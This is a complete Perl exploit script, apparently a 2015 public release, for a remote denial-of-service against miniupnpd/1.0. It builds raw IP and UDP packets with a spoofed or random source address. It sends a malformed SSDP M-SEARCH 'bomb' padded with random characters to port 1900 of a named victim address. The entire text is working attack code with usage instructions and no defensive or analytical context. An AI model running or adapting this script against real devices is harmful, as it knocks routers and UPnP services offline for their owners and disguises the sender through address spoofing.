
use Socket;
 
if ( $< != 0 ) {
   print "Sorry, must be run as root!\n";
   print "This script use RAW Socket.\n"; 
   exit;
}
 
my $ip_src = (gethostbyname($ARGV[1]))[4];
my $ip_dst = (gethostbyname($ARGV[0]))[4];
 
print "\n[  miniupnpd/1.0 remote denial of service exploit ]\n";
print "[ =============================================== ]\n";
select(undef, undef, undef, 0.40);
 
if (!defined $ip_dst) {
    print "[  Usage:\n[ ./$0 <victim address> <spoofed address>\n";
    select(undef, undef, undef, 0.55);
    print "[  Example:\n[ perl $0 192.168.1.1 133.73.13.37\n";
    print "[  Example:\n[ perl $0 192.168.1.1\n";
    print "[ =============================================== ]\n";
    print "[ 2015  <todor.donev\@gmail.com> Todor Donev  2015 ]\n\n";
    exit;
}
socket(RAW, PF_INET, SOCK_RAW, 255) or die $!;
setsockopt(RAW, 0, 1, 1) or die $!;
main();
 
    # Main program
sub main {
    my $packet;
     
    $packet = iphdr();
    $packet .= udphdr();
    $packet .= payload();
    # b000000m...
    send_packet($packet);
}
 
    # IP header (Layer 3)
sub iphdr {
    my $ip_ver           = 4;                       # IP Version 4            (4 bits)
    my $iphdr_len        = 5;                        # IP Header Length        (4 bits)
    my $ip_tos           = 0;                        # Differentiated Services (8 bits)
    my $ip_total_len     = $iphdr_len + 20;          # IP Header Length + Data (16 bits)
    my $ip_frag_id       = 0;                        # Identification Field    (16 bits)
    my $ip_frag_flag     = 000;                      # IP Frag Flags (R DF MF) (3 bits)
    my $ip_frag_offset   = 0000000000000;            # IP Fragment Offset      (13 bits)
    my $ip_ttl           = 255;                      # IP TTL                  (8 bits)
    my $ip_proto         = 17;                       # IP Protocol             (8 bits)
    my $ip_checksum      = 0;                        # IP Checksum             (16 bits)
    my $ip_src=gethostbyname(&randip) if !$ip_src;     # IP Source       (32 bits)
    # IP Packet construction
  my $iphdr  = pack(
        'H2 H2 n n B16 h2 c n a4 a4',
        $ip_ver . $iphdr_len, $ip_tos, $ip_total_len,
        $ip_frag_id, $ip_frag_flag . $ip_frag_offset,
        $ip_ttl, $ip_proto, $ip_checksum,
        $ip_src, $ip_dst
      );
 
        return $iphdr;
}
 
    # UDP header (Layer 4)
sub udphdr {
    my $udp_src_port  = 31337;                     # UDP Sort Port           (16 bits) (0-65535)
    my $udp_dst_port  = 1900;                       # UDP Dest Port           (16 btis) (0-65535)
    my $udp_len    = 8 + length(payload());     # UDP Length              (16 bits) (0-65535)
    my $udp_checksum   = 0;                         # UDP Checksum            (16 bits) (XOR of header)
 
    # UDP Packet
      my $udphdr      = pack(
        'n n n n',
        $udp_src_port, $udp_dst_port,
        $udp_len, $udp_checksum
        );
        return $udphdr;
}
 
    # Create SSDP Bomb
sub payload {
     my $data;
     my $head;
     $data = "M-SEARCH * HTTP\/1.1\\r\\n";
     for (0..1260) { $data .= chr( int(rand(25) + 65) ); }
     my $payload = pack('a' . length($data), $data);
return $payload;
}
 
    # Generate random source ip address
sub randip () {
srand(time() ^ ($$ + ($$ << 15)));
     my $ipdata;
        $ipdata   = join ('.', (int(rand(255)), int(rand(255)), int(rand(255)), int(rand(255)))), "\n";
     my $ipsrc     = pack('A' . length($ipdata), rand($ipdata));
return $ipdata;
}
 
    # Send the malformed packet
sub send_packet {
    print "[ Target: $ARGV[0]\n";
    select(undef, undef, undef, 0.30);
    print "[ Send malformed SSDP packet..\n\n";
    send(RAW, $_[0], 0, pack('Sna4x8', PF_INET, 60, $ip_dst)) or die $!;
}
